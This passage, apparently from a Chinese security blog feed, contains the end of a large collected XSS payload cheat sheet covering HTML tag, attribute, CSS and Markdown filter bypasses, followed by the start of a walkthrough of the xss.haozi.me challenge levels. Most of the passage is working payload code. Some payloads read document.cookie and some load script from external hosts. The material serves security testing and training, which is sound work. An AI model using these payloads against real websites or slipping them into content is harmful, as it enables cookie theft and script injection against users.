class="attr">lang</span>=<span class="string">ert</span> <span class="attr">onerror</span>=<span class="string">top[url</span>=<span class="string">1]alt+lang[/url]</span>&gt;</span></span><br><span class="line">// 下面的img标签都是在IE7以下版本生效</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">JaVaScRiPt:alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:alert(String.fromCharCode(49))</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"jav   ascript:alert('XSS')"</span>&gt;</span>  <span class="comment">&lt;!-- 这里空格是tab --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"jav&amp;#x09;ascript:alert('XSS');"</span>&gt;</span> <span class="comment">&lt;!-- &amp;#x09;是tab --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"jav&amp;#x0D;ascript:alert('XSS');"</span>&gt;</span> <span class="comment">&lt;!-- &amp;#x0D;是回车 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">" &amp;#14;  javascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">DYNsrc</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">LOWsrc</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=`<span class="attr">javascript:alert</span>('<span class="attr">xxxxx</span>')`&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'vbscript:msgbox("XSS")'</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"IMAGE"</span> <span class="attr">src</span>=<span class="string">"javascript:alert('XSS');"</span>&gt;</span> //IE7以下</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"javascript:alert('XSS');"</span>&gt;</span>  //IE7以下</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"x;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span>&gt;</span>  //Firefox</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sCrIpt</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">ScRipt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sCrsCrIptIpt</span>&gt;</span>alalertert(1)<span class="tag">&lt;/<span class="name">ScRsCrIptipt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006C\u0065\u0072\u0074(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>[url=<span class="number">0</span>]<span class="string">'alert'</span>[<span class="regexp">/url]</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">parent[url=<span class="number">1</span>]<span class="string">'alert'</span>[<span class="regexp">/url]</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">self[url=<span class="number">2</span>]<span class="string">'alert'</span>[<span class="regexp">/url]</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">top[url=<span class="number">3</span>]<span class="string">'alert'</span>[<span class="regexp">/url]</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://www.xss.com/1.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">[quote]<span class="tag">&lt;/<span class="name">script</span>&gt;</span>"&gt;'&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">String</span>.fromCharCode(<span class="number">49</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;&lt;SCRIPT&gt;alert(1);//&lt;&lt;/SCRIPT&gt;[/quote]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">li&#123;list-style-image: url("javascript:alert('XSS')");&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">br</span>&gt;</span>  //IE7以下</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">a&#123;width:expression(alert('11'))&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"x"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>  //IE7以下</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">.xss&#123;background-image:url("javascript:alert('XSS')");&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">xss</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>  //IE7以下</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined">BODY&#123;background:url("javascript:alert('XSS')");&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>  //IE7以下</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">BACKGROUND</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span>  //IE7以下</span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">TD</span> <span class="attr">BACKGROUND</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span>  //IE7以下</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background-image: url(javascript:alert('XSS'));"</span>&gt;</span>  //IE7以下</span><br></pre></td></tr></table></figure><h2 id="MarkDown-XSS-Payload杂烩"><a href="#MarkDown-XSS-Payload杂烩" class="headerlink" title="MarkDown XSS Payload杂烩"></a>MarkDown XSS Payload杂烩</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">a</span>](<span class="link">javascript:prompt(document.cookie</span>))</span><br><span class="line">[<span class="string">a</span>](<span class="link">j    a   v   a   s   c   r   i   p   t:prompt(document.cookie</span>))</span><br><span class="line">![<span class="string">a</span>](<span class="link">javascript:prompt(document.cookie</span>))\</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">javascript:prompt(document.cookie)</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29</span>&gt;</span></span></span><br><span class="line">![<span class="string">a</span>](<span class="link">data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</span>)\</span><br><span class="line">[<span class="string">a</span>](<span class="link">data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</span>)</span><br><span class="line">[<span class="string">a</span>](<span class="link">&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29</span>)</span><br><span class="line">![<span class="string">a'"`onerror=prompt(document.cookie)</span>](<span class="link">x</span>)\</span><br><span class="line">[<span class="symbol">citelol</span>]: <span class="link">(javascript:prompt(document.cookie))</span></span><br><span class="line">[<span class="string">notmalicious</span>](<span class="link">javascript:window.onerror=alert;throw%20document.cookie</span>)</span><br><span class="line">[<span class="string">test</span>](<span class="link">javascript://%0d%0aprompt(1</span>))</span><br><span class="line">[<span class="string">test</span>](<span class="link">javascript://%0d%0aprompt(1</span>);com)</span><br><span class="line">[<span class="string">notmalicious</span>](<span class="link">javascript:window.onerror=alert;throw%20document.cookie</span>)</span><br><span class="line">[<span class="string">notmalicious</span>](<span class="link">javascript://%0d%0awindow.onerror=alert;throw%20document.cookie</span>)</span><br><span class="line">[<span class="string">a</span>](<span class="link">data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</span>)</span><br><span class="line">[<span class="string">clickme</span>](<span class="link">vbscript:alert(document.domain</span>))</span><br><span class="line"><span class="emphasis">_http://danlec_</span>@.1 style=background-image:url(data:image/png;base64,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);background-repeat:no-repeat;display:block;width:100%;height:100px; onclick=alert(unescape(/Oh%20No!/.source));return(false);//</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">http:</span>//\&lt;<span class="attr">meta</span>\ <span class="attr">http-equiv</span>=<span class="string">\</span>"<span class="attr">refresh</span>\"\ <span class="attr">content</span>=<span class="string">\</span>"<span class="attr">0</span>;\ <span class="attr">url</span>=<span class="string">http://danlec.com/\</span>"\&gt;</span></span>&gt;</span><br><span class="line">[<span class="string">text</span>](<span class="link">http://danlec.com " [@danlec](/danlec</span>) ")</span><br><span class="line">[<span class="string">a</span>](<span class="link">javascript:this;alert(1</span>))</span><br><span class="line">[<span class="string">a</span>](<span class="link">javascript:this;alert(1&amp;#41;</span>)</span><br><span class="line">[<span class="string">a</span>](<span class="link">javascript&amp;#58this;alert(1&amp;#41;</span>)</span><br><span class="line">[<span class="string">a</span>](<span class="link">Javas&amp;#99;ript:alert(1&amp;#41;</span>)</span><br><span class="line">[<span class="string">a</span>](<span class="link">Javas%26%2399;ript:alert(1&amp;#41;</span>)</span><br><span class="line">[<span class="string">a</span>](<span class="link">javascript:alert&amp;#65534;(1&amp;#41;</span>)</span><br><span class="line">[<span class="string">a</span>](<span class="link">javascript:confirm(1</span>)</span><br><span class="line">[<span class="string">a</span>](<span class="link">javascript://www.google.com%0Aprompt(1</span>))</span><br><span class="line">[<span class="string">a</span>](<span class="link">javascript://%0d%0aconfirm(1</span>);com)</span><br><span class="line">[<span class="string">a</span>](<span class="link">javascript:window.onerror=confirm;throw%201</span>)</span><br><span class="line">[<span class="string">a</span>](<span class="link">javascript:alert(document.domain&amp;#41;</span>)</span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">http:</span>//&lt;?<span class="attr">php</span>\&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">\h1\</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">script:script</span>&gt;</span></span>confirm(2)</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/spang_33/article/details/80930046" target="_blank" rel="noopener">xss绕过，payload全集</a></p><p><a href="http://zone.secevery.com/?/article/328" target="_blank" rel="noopener">一些xss的pyload</a></p><p><a href="http://wiki.7ell.me/#!rules/sql-xss.md" target="_blank" rel="noopener">Me7ell</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这里为个人网上收集的XSS Payload，仅用于XSS攻击测试。&lt;/p&gt;
&lt;h2 id=&quot;《xss绕过，payload全集》&quot;&gt;&lt;a href=&quot;#《xss绕过，payload全集》&quot; class=&quot;headerlink&quot; title=&quot;《xss绕过，payload全集》
      
    
    </summary>
    
      <category term="Web安全基础" scheme="https://Mi1k7ea.github.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="XSS" scheme="https://Mi1k7ea.github.com/tags/XSS/"/>
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>XSS闯关之xss.haozi.me</title>
    <link href="https://Mi1k7ea.github.com/2019/02/15/XSS%E9%97%AF%E5%85%B3%E4%B9%8Bxss-haozi-me/"/>
    <id>https://Mi1k7ea.github.com/2019/02/15/XSS闯关之xss-haozi-me/</id>
    <published>2019-02-15T15:29:40.000Z</published>
    <updated>2019-02-16T07:52:52.137Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>这里写下haozi大佬的XSS闯关练习笔记。</p><p>题目网址为：<a href="https://xss.haozi.me/" target="_blank" rel="noopener">https://xss.haozi.me/</a></p><p>项目地址为：<a href="https://github.com/haozi/xss-demo" target="_blank" rel="noopener">https://github.com/haozi/xss-demo</a></p><p>注意这里有一个自带alert(1)的js地址：<a href="https://xss.haozi.me/j.js" target="_blank" rel="noopener">https://xss.haozi.me/j.js</a>。</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;div&gt;'</span> + input + <span class="string">'&lt;/div&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无任何过滤直接往div标签内写内容，直接上payload即可。下面将本次用到的XSS payload小结如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//加载外部js</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">button</span> <span class="attr">onclick</span>=<span class="string">"alert(1)"</span>&gt;</span>//点击按钮</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>//鼠标指针移动到指定的元素上时执行</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onmousemove</span>=<span class="string">alert(1)</span>&gt;</span>//鼠标移动时执行</span><br><span class="line">......还有其他onmouse系列</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:</span> <span class="attr">onmouseover</span>=<span class="string">"alert(1)"</span>&gt;</span>//鼠标移动指向图片</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:</span> <span class="attr">onclick</span>=<span class="string">"alert(1)"</span>&gt;</span>//鼠标点击图片</span><br></pre></td></tr></table></figure><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;textarea&gt;'</span> + input + <span class="string">'&lt;/textarea&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无任何过滤直接往textarea标签内写内容，直接写和上面一样的payload是不行的，因为该标签内被解析为文本内容，文本框是无法执行JS代码的，因此需要闭合该textarea标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;input type="name" value="'</span> + input + <span class="string">'"&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的DOM型XSS，无任何过滤直接往input标签内的value属性写内容，闭合掉双引号和大于号即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也可以如下构造，当鼠标指向input输入框时就会执行弹框：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" onmouseover="alert(1)</span><br></pre></td></tr></table></figure><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则过滤了[]、()等符号，那就用反引号`来替代()：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert</span>`<span class="attr">1</span>`&gt;</span></span><br></pre></td></tr></table></figure><p>当然在标签属性内也可以使用HTML实体编码绕过：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">onerror</span>=<span class="string">alert&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>直接引用外部js文件同样OK：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()`]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上一题的基础上，添加了反引号`的过滤，但前面的后两个payload是可以用的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">onerror</span>=<span class="string">alert&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span 